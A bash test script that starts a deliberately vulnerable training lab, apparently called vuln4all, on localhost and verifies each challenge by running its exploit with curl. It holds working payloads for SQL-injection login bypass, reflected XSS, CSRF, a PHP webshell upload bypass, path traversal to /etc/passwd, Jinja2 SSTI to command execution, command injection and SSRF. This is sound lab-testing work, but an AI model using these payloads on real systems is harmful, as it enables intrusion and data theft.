#!/usr/bin/env bash
# vuln4all 端到端验证：起靶场 → 用 curl 把每道题真打一遍 → 收尾。
#
# 只在隔离环境（本地虚拟机 / 专用测试机）里跑。这个脚本会真的把每道题的
# 漏洞打通一遍，并且会在最后把 workspace/ 全部重置。
#
#   bash tools/verify.sh
#   PORT=9000 bash tools/verify.sh

set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT" || exit 1

PORT="${PORT:-8800}"
BASE="http://127.0.0.1:${PORT}"
PIDFILE="/tmp/v4a-verify.pid"
LOG="/tmp/v4a-verify.log"
JAR="/tmp/v4a-verify.cookies"
rm -f "$JAR"

PASS=0
FAIL=0

ok()   { PASS=$((PASS + 1)); printf '  \033[32mPASS\033[0m  %s\n' "$1"; }
bad()  { FAIL=$((FAIL + 1)); printf '  \033[31mFAIL\033[0m  %s\n' "$1"; }
step() { printf '\n\033[1m%s\033[0m\n' "$1"; }

has() { case "$2" in *"$1"*) return 0 ;; *) return 1 ;; esac; }

expect_has()  { if has "$2" "$3"; then ok "$1"; else bad "$1（返回体里找不到 [$2]）"; fi; }
expect_no()   { if has "$2" "$3"; then bad "$1（不该出现 [$2]，却出现了）"; else ok "$1"; fi; }
expect_code() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1（期望 HTTP $3，实际 $2）"; fi; }

# 问一次某道题的 check()。这是靶场对外承诺的机器可读接口，
# 所以验证脚本直接用它 —— 不再靠"页面里有没有那句通关文案"来判断。
# 靠文案判断有过惨痛教训（见下面 strip_teaching 那段注释）。
check_solved() {
  curl -s "$BASE/__vuln4all/check/$1" \
    | python3 -c 'import json,sys; sys.exit(0 if json.load(sys.stdin).get("solved") else 1)'
}
expect_solved()   { if check_solved "$1"; then ok "$2"; else bad "$2（check() 说 $1 还没通关）"; fi; }
expect_unsolved() { if check_solved "$1"; then bad "$2（check() 说 $1 已经通关了）"; else ok "$2"; fi; }

# 检查响应头里有没有某个东西（大小写不敏感，因为头部名大小写不固定）
expect_header() { if printf '%s' "$2" | grep -qi -- "$3"; then ok "$1"; else bad "$1（响应头里没找到 $3）"; fi; }
expect_no_header() { if printf '%s' "$2" | grep -qi -- "$3"; then bad "$1（响应头里出现了 $3）"; else ok "$1"; fi; }

# 从页面里抠出一个绝对路径 —— 别在断言里硬编码，页面上那条线断了要能发现
page_path() { printf '%s' "$1" | grep -oE "/[^ <>\"]*$2" | head -n1; }

# 比较浮点数（时间盲注那一题要用）
expect_lt() { if awk "BEGIN{exit !($2 < $3)}"; then ok "$1（$2 秒）"; else bad "$1（$2 秒，期望小于 $3）"; fi; }
expect_ge() { if awk "BEGIN{exit !($2 >= $3)}"; then ok "$1（$2 秒）"; else bad "$1（$2 秒，期望至少 $3）"; fi; }

# 题目页里除了模块自己的内容，还嵌着两份 core 注入的文字：
#   1. 「提示 / 答案」折叠区 —— 答案文本就在里面
#   2. 「进度」区块 —— 目标名在里面
# 做内容断言之前必须把它们剥掉，否则随便挑一个字符串都可能在答案或目标名里找到，
# 测试就变成「永远通过」的假阳性。这个坑踩过两次：
#   · `uid=` 在答案里就有，于是坏了的那条反倒"通过"
#   · 给命令注入题写的目标名里带 `uid=`，把一条否定断言直接顶掉了
strip_teaching() {
  python3 -c '
import re, sys
html = sys.stdin.read()
html = re.sub(r"<details\b.*?</details>", "", html, flags=re.S)
html = re.sub(r"<section class=\"progress\">.*?</section>", "", html, flags=re.S)
print(html)
'
}

# 抓一个页面，并且把教学文本剥掉
page() { curl -s "$@" | strip_teaching; }

cleanup() {
  if [ -f "$PIDFILE" ]; then
    pid=$(cat "$PIDFILE")
    # 杀之前核对命令行，只杀本脚本自己起的那个进程
    if [ -r "/proc/$pid/cmdline" ] && tr '\0' ' ' <"/proc/$pid/cmdline" | grep -q "vuln4all"; then
      kill "$pid" 2>/dev/null
      sleep 1
      kill -9 "$pid" 2>/dev/null
      echo "  已停掉靶场进程 $pid"
    else
      echo "  PID $pid 的命令行对不上，没动它"
    fi
    rm -f "$PIDFILE"
  fi
}
trap cleanup EXIT

step "0. 起靶场"

# 先把自己上一次留下的残局收掉（上一次被 kill -9 时 trap 不会跑）。
# 这一步要在端口检查之前：否则自己留的进程会被当成"别人占着端口"而硬失败。
if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
  echo "  端口上已经有本脚本起的进程，先停掉"
  cleanup
fi

# 端口上如果另有其人，直接停下 —— 否则 curl 会去问那个"别人"，
# 而我们拿它的返回体做断言，跑出一堆跟本次改动无关的假结论。
# 这种事真的发生过一次：旧服务占着 8800，新进程绑不上就死了，
# 结果 16 项全红，看着像代码坏了，其实是测错了对象。
if command -v ss >/dev/null 2>&1; then
  if ss -ltn 2>/dev/null | grep -qE ":$PORT([[:space:]]|$)"; then
    bad "端口 $PORT 已经被占了，先清掉再来。占用者："
    ss -ltnp 2>/dev/null | grep -E ":$PORT([[:space:]]|$)" || true
    exit 1
  fi
else
  echo "  警告：这台机器上没有 ss，没法检查 $PORT 是否已被占用"
  echo "        如果端口上恰好有别的东西在应答，本次结果不可信"
fi

nohup python3 -m vuln4all run --port "$PORT" >"$LOG" 2>&1 &
echo $! >"$PIDFILE"
SERVERPID=$(cat "$PIDFILE")

for _ in $(seq 1 40); do
  curl -s -o /dev/null "$BASE/" && break
  sleep 0.25
done

if ! curl -s -o /dev/null "$BASE/"; then
  bad "靶场起不来，看 $LOG"
  tail -30 "$LOG"
  exit 1
fi

# 确认应答的确实是我们刚起的那个进程，而不是端口上捡来的别人
if ! kill -0 "$SERVERPID" 2>/dev/null; then
  bad "我们起的进程 $SERVERPID 已经死了，但 $PORT 上有人在应答 —— 说明在测别人"
  exit 1
fi
if [ -r "/proc/$SERVERPID/cmdline" ]; then
  if ! tr '\0' ' ' <"/proc/$SERVERPID/cmdline" | grep -q "vuln4all"; then
    bad "PID $SERVERPID 的命令行对不上，不敢往它上面做断言"
    exit 1
  fi
else
  echo "  警告：读不到 /proc/$SERVERPID/cmdline（挂载了 hidepid？），跳过命令行核对"
fi

# 再确认一下拿到的是本项目的页面，而不是同端口上的另一个服务
if ! curl -s "$BASE/" | grep -q "vuln4all"; then
  bad "$PORT 上应答的东西不是 vuln4all"
  exit 1
fi

ok "靶场起来了（pid $SERVERPID，日志 $LOG）"

step "1. 清单页与体检页"
body=$(curl -s "$BASE/")
expect_has "清单页列出 sqli"   "登录处的 SQL 注入" "$body"
expect_has "清单页列出 csrf"   "改密码处的 CSRF" "$body"
expect_has "清单页列出 xss"    "搜索框的反射型 XSS" "$body"
expect_has "清单页列出 idor"   "改个数字看别人的订单" "$body"
expect_has "清单页列出 upload" "上传头像处的文件类型绕过" "$body"
expect_has "清单页露出攻击者站点入口" "/evil-site/" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/__vuln4all/status")
expect_code "体检页可访问" "$code" "200"

step "1b. 前端"
body=$(curl -s "$BASE/")
expect_has "清单页有搜索框"          'id="v4a-search"' "$body"
expect_has "清单页有分类筛选按钮"    'class="chip' "$body"
expect_has "清单页有分类区块"        'class="cat"' "$body"
expect_has "清单页有难度筛选"        'id="v4a-diffs"' "$body"
expect_has "难度标签上了色"          'badge-diff-easy' "$body"
expect_has "页脚标了作者"            "guaidao2" "$body"

body=$(curl -s "$BASE/v/sqli/login_bypass/")
expect_has "题目页有标题卡片"        'class="hero-card"' "$body"
expect_has "题目页有提示折叠区"      "提示" "$body"
expect_has "题目页有答案折叠区"      "答案" "$body"
expect_has "题目页标了出题人"        "guaidao2" "$body"
expect_has "题目页有重置按钮"        "重置这题" "$body"

css=$(curl -s -w '\n%{http_code}' "$BASE/__vuln4all/static/style.css")
expect_has "样式表内容有新设计令牌"  "--accent" "$css"
expect_has "样式表里带上了 HTTP 状态" "200" "$css"
# 筛选 JS 靠 element.hidden 收卡片；作者来源的 .card{display:flex} 会压过
# UA 的 [hidden]{display:none}，所以样式表里必须显式重申一次
expect_has "样式表里有 [hidden] 兜底规则" "[hidden]" "$css"

step "1c. check() 接口"

report=$(curl -s "$BASE/__vuln4all/check")
expect_has "整份报告是合法 JSON 而且带 total" '"total"' "$report"
expect_has "报告里有 solved 计数"             '"solved"' "$report"
expect_has "每道题都带了挂载点"               '"mount"' "$report"
expect_has "每道题都说明支不支持自动判定"     '"supported"' "$report"

n_supported=$(printf '%s' "$report" | python3 -c 'import json,sys; print(json.load(sys.stdin)["supported"])')
n_total=$(printf '%s' "$report" | python3 -c 'import json,sys; print(json.load(sys.stdin)["total"])')
if [ "$n_supported" = "$n_total" ] && [ "$n_total" != "0" ]; then
  ok "所有 $n_total 道题都实现了 check()"
else
  bad "只有 $n_supported / $n_total 道题实现了 check()"
fi

one=$(curl -s "$BASE/__vuln4all/check/sqli/login_bypass")
expect_has "单题接口返回题目 id"     '"sqli/login_bypass"' "$one"
expect_has "单题接口返回目标列表"     '"objectives"' "$one"

code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/__vuln4all/check/no/such/module")
expect_code "不存在的题目返回 404" "$code" "404"

# check() 必须是无副作用的只读查询：连着问两次，结果必须一样
first=$(curl -s "$BASE/__vuln4all/check")
second=$(curl -s "$BASE/__vuln4all/check")
if [ "$first" = "$second" ]; then
  ok "连着问两次 check()，结果一致（无副作用）"
else
  bad "两次 check() 结果不一样 —— 有副作用"
fi

out=$(python3 main.py check)
expect_has "CLI 的 check 能用" "已通关" "$out"
out=$(python3 main.py check --json)
expect_has "CLI 的 check --json 能用" '"modules"' "$out"

step "2. SQLi —— 登录绕过"
body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username=admin" --data-urlencode "password=wrong")
expect_has "密码确实错时会报错" "用户名或密码错误" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username=admin' --" --data-urlencode "password=whatever")
expect_code "admin' --  被接受（302）" "$code" "302"

body=$(curl -s -b "$JAR" "$BASE/v/sqli/login_bypass/welcome")
expect_has "拿到 admin 身份" "这题通了" "$body"
expect_solved "sqli/login_bypass" "check() 确认 SQLi 通关"
rm -f "$JAR"

body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username='" --data-urlencode "password=x")
expect_has "单个单引号触发报错回显" "数据库报错" "$body"

step "3. XSS —— 反射"
expect_unsolved "xss/reflect_search" "注入载荷之前 check() 说未通关"

body=$(curl -s "$BASE/v/xss/reflect_search/?q=%3Cb%3Ehello%3C%2Fb%3E")
expect_has "无害标签被当成标签解析" "<b>hello</b>" "$body"

body=$(curl -s --get "$BASE/v/xss/reflect_search/" \
  --data-urlencode 'q=<script>alert(document.cookie)</script>')
expect_has "script 标签原样出现在 HTML 里" "<script>alert(document.cookie)</script>" "$body"

body=$(curl -s --get "$BASE/v/xss/reflect_search/" \
  --data-urlencode 'q=<img src=x onerror=alert(1)>')
expect_has "img onerror 载荷原样出现" "onerror=alert(1)" "$body"
expect_solved "xss/reflect_search" "check() 确认 XSS 通关"

step "4. IDOR —— 换个订单号"
curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/order_detail/login" \
  --data-urlencode "username=alice" --data-urlencode "password=alice123"
body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/orders")
expect_has "alice 看得到自己的订单" "机械键盘" "$body"
expect_no "alice 的列表里没有 bob 的订单" "礼品卡" "$body"

body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/order/1001")
expect_has "看自己的订单是正常的" "这是你自己的订单" "$body"

body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/order/1003")
expect_has "改个数字就看到 bob 的订单" "别人的订单" "$body"
expect_has "泄露了 bob 的私密备注" "别外传" "$body"
expect_solved "idor/order_detail" "check() 确认 IDOR 通关"
rm -f "$JAR"

step "5. CSRF —— 带着受害者的 cookie 改密码"
expect_unsolved "csrf/password_change" "改密码之前 check() 说未通关"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123"
body=$(curl -s -b "$JAR" "$BASE/v/csrf/password_change/profile")
expect_has "bob 登录成功进到个人中心" "员工个人中心" "$body"
expect_no "改密码表单里没有 CSRF token" 'name="csrf"' "$body"

body=$(curl -s "$BASE/evil-site/")
expect_has "攻击者站点可达" "恭喜你中奖" "$body"
expect_has "攻击者站点指向受害者站的接口" "/v/csrf/password_change/change-password" "$body"

# 反向一步：不带 Referer 的改密码请求**不算** CSRF。
# 没有 Referer 说明对面不是浏览器（curl / 脚本），那不叫跨站请求伪造。
# 这条断言在修掉"把空 Referer 也算跨站"那个 bug 之前是不可能失败的。
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
  "$BASE/v/csrf/password_change/change-password" \
  --data-urlencode "new_password=silent-change")
expect_code "不带 Referer 的改密码请求也会被服务端接受" "$code" "302"
expect_unsolved "csrf/password_change" "光用 curl（没有 Referer）不算 CSRF"

# 关键一步：带着 bob 的 session cookie，Referer 指向攻击者站点 ——
# 这就是浏览器打开 /evil-site/ 之后自动提交那个表单时发出的请求。
# curl 默认不发 Referer，所以要显式补上，否则模拟不出浏览器的行为。
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
  -H "Referer: $BASE/evil-site/" \
  "$BASE/v/csrf/password_change/change-password" \
  --data-urlencode "new_password=pwned-by-csrf")
expect_code "来自攻击者页面的改密码请求被接受（服务端不看来源）" "$code" "302"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123")
expect_code "旧密码已经不好使了" "$code" "200"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=pwned-by-csrf")
expect_code "被 CSRF 改掉的新密码能登进去" "$code" "302"
rm -f "$JAR"
expect_solved "csrf/password_change" "check() 确认 CSRF 通关"

step "6. 上传 —— 后缀与 Content-Type 绕过"
printf '<?php system($_GET[0]); ?>' >/tmp/v4a-shell.php

code=$(curl -s -o /tmp/v4a-up1.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.php;type=image/png' \
  "$BASE/v/upload/avatar/upload")
expect_code "原样 .php 被黑名单拦下（400）" "$code" "400"

code=$(curl -s -o /tmp/v4a-up2.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.PHp;type=application/octet-stream' \
  "$BASE/v/upload/avatar/upload")
expect_code "只改大小写，被 Content-Type 拦下（400）" "$code" "400"
expect_has "被拦时页面回显了客户端声明的 Content-Type" "application/octet-stream" "$(cat /tmp/v4a-up2.html)"

code=$(curl -s -o /tmp/v4a-up3.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.PHp;type=image/png' \
  "$BASE/v/upload/avatar/upload")
expect_code "两处一起绕过 —— 上传成功（200）" "$code" "200"
body=$(cat /tmp/v4a-up3.html)
expect_has "页面判定绕过成功" "绕过去了" "$body"
expect_has "页面点明通关" "这题通了" "$body"
expect_solved "upload/avatar" "check() 确认上传绕过通关"

body=$(curl -s "$BASE/v/upload/avatar/uploads/shell.PHp")
expect_has "落地的文件能被直接访问到" '<?php system' "$body"

step "7. reset —— 恢复出厂"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=csrf/password_change")
expect_code "页面上的重置按钮生效（303）" "$code" "303"

rm -f "$JAR"
code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123")
expect_code "重置后 bob 的密码复原了" "$code" "302"
rm -f "$JAR"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/order_detail/login" \
  --data-urlencode "username=alice" --data-urlencode "password=alice123"
body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/orders")
expect_has "只重置了一题，别的题的数据没被动" "机械键盘" "$body"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=*")
expect_code "重置全部（303）" "$code" "303"

body=$(curl -s "$BASE/v/upload/avatar/")
expect_no "重置全部后上传的文件被清掉了" "shell.PHp" "$body"

# reset 必须把进度也一起清掉。这是把 progress 落在 workspace 里换来的好处：
# core 清目录的时候顺手就把它带走了，模块不用为进度单独写 reset()。
left=$(curl -s "$BASE/__vuln4all/check" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["solved"])')
if [ "$left" = "0" ]; then
  ok "重置全部之后所有 check() 都回到未通关"
else
  bad "重置之后还有 $left 道题被判成已通关 —— 进度没清干净"
fi

# 浏览器发起的跨站重置应该被拒（curl 不带 Origin，所以上面那些不受影响）
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  -H "Origin: http://evil.example" --data-urlencode "id=*")
expect_code "跨站来的重置请求被拒（403）" "$code" "403"

# 开放重定向：反斜杠变体
loc=$(curl -s -o /dev/null -w '%{redirect_url}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=sqli/login_bypass" --data-urlencode 'next=/\evil.example')
case "$loc" in
  *evil.example*) bad "next=/\evil.example 被放行了（开放重定向）：$loc" ;;
  *)              ok  "反斜杠变体的 next 被吃掉了" ;;
esac

rm -f /tmp/v4a-shell.php /tmp/v4a-up1.html /tmp/v4a-up2.html /tmp/v4a-up3.html "$JAR"

step "8. 命令行"
out=$(python3 -m vuln4all list)
expect_has "list 认得所有分类" "[upload]" "$out"

out=$(python3 -m vuln4all doctor 2>&1)
ec=$?
expect_no "doctor 不再把 templates/ 误报成缺 module.py" "templates 这个目录下" "$out"
expect_no "doctor 不再提 __pycache__" "__pycache__" "$out"
if [ "$ec" = "0" ]; then ok "doctor 退出码是 0"; else bad "doctor 退出码是 $ec"; fi

step "8b. main.py 主入口"
out=$(python3 main.py list)
expect_has "main.py list 能用" "[upload]" "$out"

out=$(python3 main.py doctor 2>&1)
if [ "$?" = "0" ]; then ok "main.py doctor 退出码是 0"; else bad "main.py doctor 退出码非 0"; fi

# 不带子命令直接跑 main.py，应该就是启动靶场。
# 端口从 $PORT 派生，并且和主流程一样先确认没人占着 ——
# 否则一个被占的端口会报成"期望 200，实际 000"，指向完全错误的方向。
PORT2=$((PORT + 4))
if command -v ss >/dev/null 2>&1 && ss -ltn 2>/dev/null | grep -qE ":$PORT2([[:space:]]|$)"; then
  bad "端口 $PORT2 被占了，跳过 main.py 起服务这一项"
else
  nohup python3 main.py --port "$PORT2" >/tmp/v4a-main.log 2>&1 &
  MAINPID=$!
  for _ in $(seq 1 40); do
    curl -s -o /dev/null "http://127.0.0.1:$PORT2/" && break
    sleep 0.25
  done
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT2/")
  expect_code "python3 main.py 不带子命令就起了靶场" "$code" "200"
  body=$(curl -s "http://127.0.0.1:$PORT2/")
  expect_has "main.py 起的靶场清单页正常" "登录处的 SQL 注入" "$body"

  if [ -r "/proc/$MAINPID/cmdline" ] && tr '\0' ' ' <"/proc/$MAINPID/cmdline" | grep -q "main.py"; then
    kill "$MAINPID" 2>/dev/null
    sleep 1
    kill -9 "$MAINPID" 2>/dev/null
  fi
fi

# 全局选项写在子命令前面也要能走通（这条以前会被误当前置成 run）
out=$(python3 main.py --home "$ROOT" list)
expect_has "main.py --home X list 能走通" "[upload]" "$out"

step "9. core 契约加固（在 /tmp 的副本里做，不动真靶场）"
LAB=/tmp/v4a-hardening
rm -rf "$LAB"
mkdir -p "$LAB"
cp -r "$ROOT/vuln4all" "$ROOT/modules" "$LAB/"

cd "$LAB" || exit 1

# ---- 9a 归一化撞名：id 里的 - 和 _ 必须能共存（sqli/login_bypass 已存在）
mkdir -p "modules/sqli/login-bypass"
cat >"modules/sqli/login-bypass/module.py" <<'PY'
"""对照组：这个 id 用连字符，必须和 modules/sqli/login_bypass 各自独立。"""
from vuln4all import Vuln


class DashVariant(Vuln):
    info = {
        "name": "连字符对照组",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "用来验证归一化撞名已经修掉。",
        "hint": "-",
        "solution": "-",
    }

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        @app.route("/")
        def index():
            return "dash-variant"

        return {"": app}
PY

# ---- 9b 抢占 core 的保留前缀
mkdir -p "modules/zztest/reserved_path"
cat >"modules/zztest/reserved_path/module.py" <<'PY'
"""这个模块想把 core 的体检页抢过来，应该被摘掉。"""
from vuln4all import Vuln


class StealStatus(Vuln):
    info = {
        "name": "抢体检页",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被拒绝。",
        "hint": "-",
        "solution": "-",
        "mounts": {"evil": {"path": "/__vuln4all/status"}},
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        evil = ctx.flask(__name__, mount="evil")

        @main.route("/")
        def index():
            return "main"

        @evil.route("/")
        def hijack():
            return "HijackedStatus"

        return {"": main, "evil": evil}
PY

# ---- 9c 抢占已经被别的模块占了的挂载点
mkdir -p "modules/zztest/steal_evil"
cat >"modules/zztest/steal_evil/module.py" <<'PY'
"""这个模块想挂到 /evil-site，但那个位置是 csrf/password_change 的。"""
from vuln4all import Vuln


class StealEvil(Vuln):
    info = {
        "name": "抢别人的挂载点",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被拒绝。",
        "hint": "-",
        "solution": "-",
        "mounts": {"steal": {"path": "/evil-site"}},
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        steal = ctx.flask(__name__, mount="steal")

        @main.route("/")
        def index():
            return "main"

        @steal.route("/")
        def taken():
            return "StolenEvilSite"

        return {"": main, "steal": steal}
PY

# ---- 9d 多挂载点忘了传 mount=：两個 app 会用同一个 session cookie
mkdir -p "modules/zztest/forgot_mount"
cat >"modules/zztest/forgot_mount/module.py" <<'PY'
"""第二个 app 故意不传 mount=，doctor 应该抓出来。"""
from vuln4all import Vuln


class ForgotMount(Vuln):
    info = {
        "name": "忘了传 mount",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被检查出来。",
        "hint": "-",
        "solution": "-",
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        second = ctx.flask(__name__)  # <- 忘了 mount="second"

        @main.route("/")
        def index():
            return "main"

        @second.route("/")
        def other():
            return "second"

        return {"": main, "second": second}
PY

# ---- 9e 主挂载点被抢：这时 entry.error 会被置上，doctor 必须还能说出是被谁抢的
mkdir -p "modules/zztest/main_conflict"
cat >"modules/zztest/main_conflict/module.py" <<'PY'
"""主挂载点被别人占了 —— 报错信息里必须说清是被谁占的。"""
from vuln4all import Vuln


class MainConflict(Vuln):
    info = {
        "name": "主挂载点被占",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被判失败，而且要报出被谁占了。",
        "hint": "-",
        "solution": "-",
        "mounts": {"": {"path": "/evil-site"}},
    }

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        @app.route("/")
        def index():
            return "main-conflict"

        return {"": app}
PY

out=$(python3 -m vuln4all doctor 2>&1)
expect_has "doctor 认出抢占 core 保留前缀" "撞上了 core 保留前缀" "$out"
expect_has "doctor 认出抢占别的模块的挂载点" "已经被 csrf/password_change 占了" "$out"
expect_has "doctor 认出忘了传 mount=" "mount=" "$out"
expect_has "主挂载点被抢时仍然报得出被谁抢的" "被摘掉了" "$out"

# ---- 9f 脚手架生成的骨架没改完时，doctor 应该直接说出来
# （尤其是作者名 —— 靠"记得改"是拦不住的，只能靠工具）
python3 -m vuln4all new zztest/fresh_scaffold >/dev/null 2>&1

# 直接看骨架文件，确认作者默认值不是某个具体的人
expect_has "骨架的作者默认值是待填的占位，不是某个人的名字" "TODO 你的名字" \
  "$(cat modules/zztest/fresh_scaffold/module.py)"

out=$(python3 -m vuln4all doctor zztest/fresh_scaffold 2>&1)
expect_has "doctor 认出没改完的骨架" "TODO 占位文本" "$out"
expect_has "并把占位原文打出来方便定位" "author（TODO 你的名字）" "$out"

# 把 TODO 填掉之后就不该再报
python3 - <<'PY'
from pathlib import Path
path = Path("modules/zztest/fresh_scaffold/module.py")
text = path.read_text(encoding="utf-8")
for old, new in (
    ('["TODO 你的名字"]', '["某个贡献者"]'),
    ('"TODO，例如 CWE-89"', '"CWE-79"'),
    ('"TODO，例如 A03:2021 - Injection"', '"A03:2021 - Injection"'),
    ('"TODO，入门 / 进阶 / 困难 三选一"', '"入门"'),
    ('"TODO 一句话说清漏洞在哪。"', '"测试用。"'),
    ('"TODO 给做题的人的提示：先试什么、观察什么。别直接写答案。"', '"先试试看。"'),
    ('"TODO 具体怎么打通，最好给一条能直接复制的 payload。"', '"随便打。"'),
):
    text = text.replace(old, new)
path.write_text(text, encoding="utf-8")
PY
out=$(python3 -m vuln4all doctor zztest/fresh_scaffold 2>&1)
expect_no "把占位填掉之后就不再报" "TODO 占位文本" "$out"

out=$(python3 -m vuln4all doctor 2>&1)
expect_no "现有 12 道题不会被这条检查误伤" "TODO 占位文本" "$out"

lst=$(python3 -m vuln4all list 2>&1)
expect_has "带连字符的 id 能共存" "sqli/login-bypass" "$lst"
expect_has "带下划线的 id 还在" "sqli/login_bypass" "$lst"

# 真起一次：归一化撞名会让后加载的顶掉先加载的，core 的体检页也会被抢走
nohup python3 -m vuln4all run --port 8803 >/tmp/v4a-lab.log 2>&1 &
LABPID=$!
for _ in $(seq 1 40); do
  curl -s -o /dev/null http://127.0.0.1:8803/ && break
  sleep 0.25
done
body=$(curl -s http://127.0.0.1:8803/__vuln4all/status)
expect_has "core 的体检页没被抢走" "体检" "$body"
expect_no "抢挂载点的模块没盖住 core" "HijackedStatus" "$body"

body=$(curl -s http://127.0.0.1:8803/v/sqli/login-bypass/)
expect_has "连字符那个模块自己跑起来了" "dash-variant" "$body"
body=$(curl -s http://127.0.0.1:8803/v/sqli/login_bypass/)
expect_has "下划线那个模块没被顶掉" "员工登录" "$body"

if [ -r "/proc/$LABPID/cmdline" ] && tr '\0' ' ' <"/proc/$LABPID/cmdline" | grep -q "vuln4all"; then
  kill "$LABPID" 2>/dev/null
  sleep 1
  kill -9 "$LABPID" 2>/dev/null
fi

cd "$ROOT" || exit 1
rm -rf "$LAB"

step "10. 第二批模块（不同难度 / 不同业务场景）"

# ---- path_traversal/file_download —— 企业网盘
expect_unsolved "path_traversal/file_download" "穿越之前 check() 说未通关"

body=$(curl -s --get "$BASE/v/path_traversal/file_download/download" \
  --data-urlencode "name=../内部资料/薪资表.csv")
expect_has "路径穿越读到共享目录外的文件" "vuln4all{path_traversal_ok}" "$body"
expect_solved "path_traversal/file_download" "check() 确认路径穿越通关"

body=$(curl -s --get "$BASE/v/path_traversal/file_download/download" \
  --data-urlencode "name=/etc/passwd")
expect_has "绝对路径顶掉基准目录（os.path.join 的坑）" "root:" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' --get \
  "$BASE/v/path_traversal/file_download/download" \
  --data-urlencode "name=/nonexistent-nope")
expect_code "不存在的文件返回 404" "$code" "404"

# ---- ssti/jinja2_profile —— 团队协作 SaaS
expect_unsolved "ssti/jinja2_profile" "动手之前 check() 说未通关"

body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" --data-urlencode "template={{7*7}}")
expect_has "模板被求值（7*7 -> 49）" "49" "$body"
expect_has "里程碑记录下来了"        "模板被求值" "$body"

body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" --data-urlencode "template={{config}}")
expect_has "config 被渲染出来" "SECRET_KEY" "$body"

body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" \
  --data-urlencode "template={{ cycler.__init__.__globals__.os.popen('id').read() }}")
expect_has "SSTI 拿到命令执行" "uid=" "$body"
expect_solved "ssti/jinja2_profile" "check() 确认 SSTI 三个里程碑全达成"

# ---- command_injection/ping_tool —— 运维诊断
body=$(page -X POST "$BASE/v/command_injection/ping_tool/" \
  --data-urlencode "host=127.0.0.1; id")
expect_has "命令注入拿到 uid=" "uid=" "$body"
expect_solved "command_injection/ping_tool" "check() 确认命令注入通关"

body=$(page -X POST "$BASE/v/command_injection/ping_tool/" \
  --data-urlencode "host=127.0.0.1")
expect_no "正常输入不该出现 uid=" "uid=" "$body"

# ---- ssrf/url_preview —— 聊天链接预览（双挂载点）
IMPLANT="http://img.vuln4all.local@127.0.0.1:${PORT}/internal-admin/"
body=$(page -X POST "$BASE/v/ssrf/url_preview/" --data-urlencode "url=$IMPLANT")
expect_has "SSRF 打到内网管理后台" "内部管理后台" "$body"
expect_solved "ssrf/url_preview" "check() 确认 SSRF 通关"

body=$(page -X POST "$BASE/v/ssrf/url_preview/" \
  --data-urlencode "url=http://example.com/x.png")
expect_has "白名单确实在拦（不含标记的域名被拒）" "只允许抓取" "$body"

# 过了白名单、但目标不是内网后台 —— 应该抓不到那个标记。
# 这一条是用来证明上面那个 PASS 是"真抓到了"，而不是断言写松了。
body=$(page -X POST "$BASE/v/ssrf/url_preview/" \
  --data-urlencode "url=http://img.vuln4all.local@127.0.0.1:${PORT}/nope")
expect_no "过了白名单但目标不对，抓不到内网内容" "内部管理后台" "$body"

body=$(curl -s "$BASE/")
expect_no "内网后台的路径不出现在清单页上" "/internal-admin" "$body"
expect_has "清单页只提示有这么个隐藏入口" "隐藏入口" "$body"

